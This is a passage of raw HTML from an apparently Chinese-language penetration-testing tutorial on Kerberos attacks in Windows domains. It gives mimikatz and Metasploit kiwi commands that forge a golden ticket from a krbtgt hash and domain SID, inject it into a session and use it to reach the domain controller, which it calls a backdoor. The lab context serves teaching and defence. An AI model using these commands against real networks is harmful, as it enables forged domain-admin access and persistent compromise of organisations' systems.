&quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后，我们切换到普通域用户的机器Windows 7，用 mimikatz 生成名为 ticket.kirbi 的 TGT 凭证，用户名为 administrator：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">golden </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">user</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">administrator </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">domain</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">sid</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">S</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">21</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1315137663</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3706837544</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1429009142</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">krbtgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">6be58bfcc0a164af2408d1d3bd313c2a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ticket</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ticket</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># kerberos::golden /user:需要伪造的域管理员用户名 /domain:域名 /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.36103723404255317" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/4_43Izr1rN5xXFl1aetp33S9OhLcR4Jw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBljUC6cLSPnyV76RYAooknEKgn43Izr1rN5xXFl1aetp33S9OhLcR4Jw/640?wx_fmt=png'" data-type="png" data-w="1504" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521090438038</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">如上图所示，成功生成 TGT 凭证 ticket.kirbi，名为 ticket.kirbi，然后使用 mimikatz 将凭证ticket.kirbi 注入进去：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="cmd" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ptt ticket</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kirbi</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">#kerberos::ptt &lt;票据文件&gt;</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.18699186991869918" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/5_DicaNkcOv1NlLIhsO8ibPtEWj2Xz9g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBl5GZgfpcUWiaaNlIRIGuvicibdoPY3DicaNkcOv1NlLIhsO8ibPtEWj2Xz9g/640?wx_fmt=png'" data-type="png" data-w="615" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521090706436</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">此时我们可以执行以下来查看当前会话中的票据，就可以发现刚刚注入的票据在里面了：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="bash" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">::</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tgt</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.2966194111232279" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/6_dgEib91EhwT6cLd15VHVrSpLFw8Ghg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlWRNUUKWLs5ibSSqCEPfrwXKJeodgEib91EhwT6cLd15VHVrSpLFw8Ghg/640?wx_fmt=png'" data-type="png" data-w="917" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521091230421</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">到此，注入成功。输入“exit”退出mimikatz，此时，攻击者就可以利用 Windows 7 任意访问域控了：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dir \\DC\c$</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.37961595273264404" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/7_zpS5GVAnE9sfQmtpIWHYv03bR4TG3A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBl9slzg8biczhx7zuvEMbxbWAYtzpS5GVAnE9sfQmtpIWHYv03bR4TG3A/640?wx_fmt=png'" data-type="png" data-w="677" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521092047545</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">也可以使用 psexec，wmi 等方法对域控进行远程执行命令：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6973434535104365" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/8_A8AuM2waylzayD1e5Q4xBMNlRVzKOQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBl2B3ibH1ETz0zKGYc2Pvmqkl0HA8AuM2waylzayD1e5Q4xBMNlRVzKOQ/640?wx_fmt=png'" data-type="png" data-w="1054" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521092450447</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">可见，黄金票据可以当做一个安装在普通域成员主机上的连接到域控的后门。</p><h3 style="margin-top: 2em;margin-right: 8px;margin-bottom: 0.75em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.2;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.1em;font-weight: bold;padding-left: 8px;border-left: 3px solid rgb(15, 76, 129);">Metasploit 下的利用</h3><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">在 Metasploit 中也有对应的利用模块。</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先我们需要让 Windows 7 上线一个 MSF 的会话：</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.19610091743119265" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/9_C4nFmT5eEahOicAgezrAcgaH8nZYDg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlohShpV2YtDY2n0SUr0gFg2J3cC4nFmT5eEahOicAgezrAcgaH8nZYDg/640?wx_fmt=png'" data-type="png" data-w="872" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521110157111</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后再这个 meterpreter 中加载 kiwi 模块：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="ruby" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">load kiwi</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.30158730158730157" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/10_z5VOJ3rujM7nFpBNmTngIMzZJNqbsA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBltFT8gnpkpD6S1PcvhDJuVytJz5VOJ3rujM7nFpBNmTngIMzZJNqbsA/640?wx_fmt=png'" data-type="png" data-w="693" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"  /><figcaption style="-webkit-tap-highlight-color: transparent;text-align: center;color: rgb(136, 136, 136);line-height: 1.75;font-size: 0.8em;">image-20210521110436981</figcaption></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">然后输入命令生成票据：</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal;"><pre data-lang="ruby" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">golden_ticket_create </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d whoamianony</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">org </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">k </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">6be58bfcc0a164af2408d1d3bd313c2a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">s S</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">5</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">21</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1315137663</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">3706837544</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1429009142</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">u administrator </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">t </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">root</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">krbtgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ticket</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># golden_ticket_create -d 域名 -k krbtgt用户的Hash -s 域sid -u 需要伪造的域管理员用户名 -t /root/krbtgt.ticket</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos_ticket_list </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># 查看本地储存的票据</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">kerberos_ticket_use </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">root</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">krbtgt</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">ticket </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);"># 将票据注入内存</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.11802120141342756" src="图片/HACK学习呀_2021-06-26_内网渗透Kerberos协议相关安全问题分析与利用/11_ibHL2Z6SOtIAQPpMPMjrlibMDxE3fw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8sxgzUUjNZr9Jok4PCiaLBlCg2qDrn5jRCokX4vgPIKkeGYG3ibHL2Z6SOtIAQPpMPMjrlibMDxE3fw/640?wx_fmt=png'" data-type="png" data-w="1415" style="margin: 0.1em auto 